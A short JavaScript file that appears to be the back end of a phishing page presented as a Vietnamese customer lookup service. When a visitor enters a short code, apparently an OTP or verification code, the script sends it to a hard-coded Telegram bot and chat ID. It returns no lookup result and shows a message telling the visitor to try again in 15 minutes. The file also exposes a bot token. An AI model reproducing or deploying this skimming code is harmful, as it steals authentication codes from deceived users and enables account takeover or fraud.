const botToken = '6754933633:AAFl_3EjKVAKO_ji1v4q34B_aAz2O4K2KKQ';
const chatId = '-1002180330757'

async function lookup() {
    let code = document.getElementById('code').value;

    if (code && code.length < 10) {
        const message = `Code: ${code}`

        await sendMessage(message)

        alert('Qúy khách vui lòng tra cứu lại sau 15 phút.')

        document.getElementById('code').value = ''
    }
}

async function sendMessage(message) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({chat_id: chatId, text: message})
        })
    } catch (e) {
        console.error(e);
    }
}